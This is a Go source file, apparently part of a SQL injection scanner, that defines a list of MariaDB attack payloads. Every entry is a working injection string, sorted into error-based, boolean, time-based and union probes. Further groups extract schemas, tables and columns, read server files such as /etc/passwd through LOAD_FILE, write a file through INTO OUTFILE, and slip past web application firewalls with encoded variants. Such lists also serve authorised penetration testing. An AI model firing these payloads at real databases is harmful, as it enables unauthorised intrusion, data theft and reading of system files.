package payloads

var MariaDB = PayloadGroup{
	DBMS: "MariaDB",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED (MariaDB-specific)
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, VERSION(), 0x7e, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a)--"},
		{Type: "error", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT USER()), 0x7e, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a)--"},
		{Type: "error", Content: "' AND extractvalue(1, CONCAT(0x7e, (SELECT @@version_compile_os)))--"},
		{Type: "error", Content: "' AND updatexml(1, CONCAT(0x7e, (SELECT @@version_compile_machine)), 1)--"},
		{Type: "error", Content: "' AND 1=(SELECT @:=1 FROM information_schema.PLUGINS GROUP BY (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT DATABASE()), 0x7e, FLOOR(RAND(0)*2)) x FROM information_schema.PLUGINS GROUP BY x) a))--"},
		{Type: "error", Content: "' AND 1=ROW(1,1)>(SELECT COUNT(*), CONCAT(0x7e, (SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1), 0x7e) FROM information_schema.PLUGINS GROUP BY CONCAT(0x7e, (SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1), 0x7e))--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED (MariaDB-specific)
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1 FROM DUAL)=(SELECT 1 FROM DUAL)--", Expected: "true"},
		{Type: "boolean", Content: "' AND EXTRACTVALUE(1,1)=1--", Expected: "true"},

		// ═══════════════════════════════════════════
		// TIME-BASED (BENCHMARK + SLEEP)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "' AND SLEEP(5)--"},
		{Type: "time", Content: "') AND SLEEP(10)--"},
		{Type: "time", Content: "'; SELECT SLEEP(5)--"},
		{Type: "time", Content: "' AND BENCHMARK(5000000, MD5('test'))--"},
		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM information_schema.COLUMNS A, information_schema.COLUMNS B, information_schema.COLUMNS C)--"},
		{Type: "time", Content: "' OR SLEEP(5)='"},
		{Type: "time", Content: "' AND 1=1 UNION SELECT SLEEP(5)--"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' ORDER BY 1--"},
		{Type: "union", Content: "' ORDER BY 2--"},
		{Type: "union", Content: "' ORDER BY 3--"},
		{Type: "union", Content: "' ORDER BY 4--"},
		{Type: "union", Content: "' ORDER BY 5--"},
		{Type: "union", Content: "' ORDER BY 6--"},
		{Type: "union", Content: "' UNION SELECT NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3,4--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA--"},
		{Type: "deep", Content: "' UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE()--"},
		{Type: "deep", Content: "' UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'--"},
		{Type: "deep", Content: "' UNION SELECT @@version--"},
		{Type: "deep", Content: "' UNION SELECT VERSION()--"},
		{Type: "deep", Content: "' UNION SELECT USER()--"},
		{Type: "deep", Content: "' UNION SELECT DATABASE()--"},
		{Type: "deep", Content: "' UNION SELECT @@datadir--"},
		{Type: "deep", Content: "' UNION SELECT @@basedir--"},
		{Type: "deep", Content: "' UNION SELECT @@version_compile_os--"},

		// ═══════════════════════════════════════════
		// FILE READ/WRITE
		// ═══════════════════════════════════════════
		{Type: "stacked", Content: "' UNION SELECT LOAD_FILE('/etc/passwd')--"},
		{Type: "stacked", Content: "' UNION SELECT LOAD_FILE('/etc/hostname')--"},
		{Type: "stacked", Content: "' UNION SELECT LOAD_FILE(CONCAT('/var/lib/mysql/', DATABASE(), '/users.MYD'))--"},
		{Type: "stacked", Content: "'; SELECT 'shell_exec' INTO OUTFILE '/tmp/udf.so'--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'%00OR%201=1--"},
		{Type: "bypass", Content: "'+OR+1=1--"},
		{Type: "bypass", Content: "'%09OR%091=1--"},
		{Type: "bypass", Content: "'%0AOR%0A1=1--"},
		{Type: "bypass", Content: "'/*!OR*/1=1--"},
		{Type: "bypass", Content: "'/*!50000OR*/1=1--"},
		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
	},
}

